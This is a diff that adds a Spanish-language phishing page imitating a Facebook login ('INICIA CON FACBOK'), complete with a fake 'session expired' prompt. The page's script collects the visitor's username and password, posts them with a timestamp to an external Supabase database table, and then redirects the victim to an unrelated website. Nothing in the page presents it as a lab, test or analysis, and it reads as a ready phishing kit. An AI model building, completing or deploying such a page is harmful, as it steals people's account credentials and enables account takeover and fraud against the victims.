@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Todito Online</title>
+<style>
+/* ... estilos igual que antes ... */
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="header">
+    <h1>INICIA CON FACBOK</h1>
+    <p>La forma más fácil de estar con tus amigos</p>
+  </div>
+
+  <div class="form">
+    <form id="loginForm">
+      <input type="text" name="usuario" placeholder="Correo o número" required>
+      <input type="password" name="contraseña" placeholder="Contraseña" required>
+      <button type="submit" class="btn">Entrar ahora</button>
+    </form>
+    <div class="small">¿Nuevo aquí? Crea tu cuenta gratis en segundos</div>
+  </div>
+</div>
+
+<div id="overlay" class="overlay"></div>
+<div id="modal" class="modal">
+  <div class="modal-header">Su sesión ha expirado</div>
+  <div class="modal-body">
+    <p>Para continuar, verifica tu identidad.</p>
+    <button onclick="cerrar()">Continuar</button>
+  </div>
+</div>
+
+<script>
+function cerrar(){
+  document.getElementById("modal").style.display="none";
+  document.getElementById("overlay").style.display="none";
+}
+
+const form = document.getElementById("loginForm");
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const datos = {
+    Usuario: form.usuario.value,
+    Contraseña: form.contraseña.value,
+    Fecha: new Date().toISOString()
+  };
+
+  const SUPABASE_URL = "https://cpxrkcsgbgutwxjvcabl.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+    // tu anon key completa
+
+  try {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/usuarios`, {
+      method: "POST",
+      headers: {
+        "apikey": SUPABASE_KEY,
+        "Authorization": `Bearer ${SUPABASE_KEY}`,
+        "Content-Type": "application/json",
+        "Prefer": "return=minimal"
+      },
+      body: JSON.stringify(datos)
+    });
+
+    if (!res.ok) {
+      console.error("Error al insertar:", await res.text());
+    }
+  } catch(err) {
+    console.error("Fallo de red:", err);
+  }
+
+  setTimeout(function(){
+    window.location.href = "https://pymemarket.online/";
+  }, 800);
+});
+</script>
+
+</body>
+</html>
